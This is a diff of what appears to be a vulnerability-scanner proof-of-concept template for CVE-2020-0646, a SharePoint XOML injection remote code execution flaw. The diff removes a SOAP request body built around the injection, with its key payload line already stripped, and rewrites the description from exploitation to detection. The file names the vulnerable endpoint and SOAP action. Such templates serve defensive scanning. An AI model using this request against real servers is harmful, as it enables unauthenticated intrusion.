@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向 SharePoint _vti_bin/webpartpages.asmx SOAP 接口发送特制 XOML 载荷，利用 CallExternalMethodActivity 的 InterfaceType 属性注入恶意 C# 代码，绕过 Workflow 编译器的 nocode 限制实现远程代码执行。无需认证即可触发，影响严重。"
+description = "通过向 SharePoint 的 webpartpages.asmx SOAP 接口发送包含恶意 XOML 工作流标记的请求，检测 .NET Framework 远程代码执行注入漏洞（CVE-2020-0646）。该检测通过构造包含 CallExternalMethodActivity 代码注入载荷的 SOAP 请求，并检查响应中是否包含有效的 SOAP 响应体来判断目标是否存在漏洞。"
 id = "POC-AVE-2020-0008"
-name = "Microsoft SharePoint .NET Framework XOML Injection RCE PoC"
+name = "Microsoft SharePoint XOML Injection PoC"
 severity = "critical"
 tags = ["ave-2020-0008"]
 vuln_id = [
@@ -19,27 +19,12 @@ path = "/{{BaseURL}}/_vti_bin/webpartpages.asmx"
 protocol = "http"
 
 [poc.requests.body]
-content = """
-<?xml version="1.0" encoding="utf-8"?>
-<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-<soap:Body>
-<ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
-<workflowMarkupText><![CDATA[
-<SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
-# [cleanup] skipped line with string multiplication: <CallExternalMethodActivity x:Name="foo" MethodName='test1' 
-</SequentialWorkflowActivity>
-]]></workflowMarkupText>
-<rulesText></rulesText>
-<configBlob></configBlob>
-<flag>2</flag>
-</ValidateWorkflowMarkupAndCreateSupportObjects>
-</soap:Body>
-</soap:Envelope>"""
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "text/xml; charset=utf-8"
 SOAPAction = "http://microsoft.com/sharepoint/webpartpages/ValidateWorkflowMarkupAndCreateSupportObjects"
+User-Agent = "Mozilla/5.0"
 
 [[poc.requests.matchers]]
 expect = true
